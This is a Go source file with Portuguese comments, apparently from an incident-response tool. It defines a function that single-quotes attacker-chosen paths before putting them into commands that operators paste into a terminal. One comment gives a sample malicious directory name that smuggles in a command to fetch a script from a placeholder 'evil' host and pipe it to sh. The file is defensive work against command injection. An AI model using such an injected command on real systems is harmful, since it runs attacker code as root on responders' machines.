package check

import "strings"

// Arg torna um valor vindo do HOST seguro dentro de um comando que o operador
// vai colar num terminal.
//
// # Por que isto existe
//
// Todo achado imprime um passo seguinte pronto para colar, e vários deles levam
// um caminho dentro:
//
//	sudo cp /tmp/.x "$IR/"   # a amostra, antes de qualquer coisa
//
// O caminho vem do host que está sendo investigado, e quem o escolheu foi o
// atacante. Um diretório chamado
//
//	/tmp/.x;curl -s http://evil/i|sh;#
//
// produzia a linha acima com o ponto-e-vírgula intacto — e o `#` comendo o
// resto. Colada num shell de root, ela executa o que o atacante quiser. Pior: os
// comandos de nuvem e de git são para rodar na ESTAÇÃO LIMPA do respondedor, que
// é onde ficam as credenciais da frota inteira.
//
// Isso foi reproduzido contra o binário real por uma revisão. A ferramenta
// existe para examinar host hostil; virar o meio de entrega do implante é o pior
// defeito que ela poderia ter.
//
// # Por que aspas simples
//
// Dentro de aspas simples o shell não interpreta NADA — nem `$`, nem crase, nem
// `;`, nem quebra de linha. O único caractere que precisa de tratamento é a
// própria aspa simples, que se fecha, escapa e reabre: o `'\”` clássico.
//
// `report.Safe` não substitui isto: ele escapa caractere de CONTROLE, para o
// terminal não ser pintado; `;`, `|` e `$` são ASCII imprimível e passam
// intactos por ele, como devem.
func Arg(s string) string {
	if s == "" {
		return "''"
	}
	if simplesEmAspasNaoPrecisa(s) {
		return s
	}
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// simplesEmAspasNaoPrecisa evita encher o relatório de aspas onde elas não
// acrescentam nada. O conjunto é conservador de propósito: qualquer coisa fora
// dele vai para dentro das aspas, inclusive espaço e acento.
func simplesEmAspasNaoPrecisa(s string) bool {
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case r == '/', r == '.', r == '_', r == '-', r == ':', r == '=', r == ',', r == '+', r == '@':
		default:
			return false
		}
	}
	return true
}
